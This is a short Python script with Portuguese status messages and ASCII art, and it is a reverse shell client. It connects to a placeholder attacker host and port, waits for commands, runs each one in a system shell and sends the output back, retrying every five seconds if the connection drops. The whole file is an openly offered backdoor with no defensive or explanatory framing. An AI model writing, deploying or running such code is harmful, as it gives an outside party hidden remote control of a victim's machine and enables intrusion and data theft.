import socket
import subprocess
import time
import os

menu ="""
                           ,--.
                          {    }
                          K,   }
                         /  `Y`
                    _   /   /
                   {_'-K.__/
                     `/-.__L._
                     /  ' /`\_}
                    /  ' /
            ____   /  ' /
     ,-'~~~~    ~~/  ' /_
   ,'             ``~~~%%',
  (                     %  Y
 {                      %% I
{      -                 %  `.
|       ',                %  )
|        |   ,..__      __. Y
|    .,_./  Y ' / ^Y   J   )|
\           |' /   |   |   ||
 \          L_/    . _ (_,.'(
  \,   ,      ^^""' / |      )
    \_  \          /,L]     /
      '-_`-,       ` `   ./`
         `-(_            )
             ^^\..___,.--`
"""

def main():
    while True:
        os.system("clear")
        print(menu)
        try:
            host = "IP HOST"
            porta = "PORTA"
            cliente = socket.socket()
            print("Iniciando conexao...")
            cliente.connect((host, porta))
            print("Conexao iniciada")

            while True:
                    print("Esperando comandos")
                    comando = cliente.recv(1024)
                    comando = comando.decode()
                    op = subprocess.Popen(comando, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                    output = op.stdout.read()
                    print("Enviando resposta")
                    cliente.send(output)

        except:
            print("[!] Error")
            print("[!] Espere 5 segundos...")
            time.sleep(5)
            pass

if __name__ == "__main__":
    main()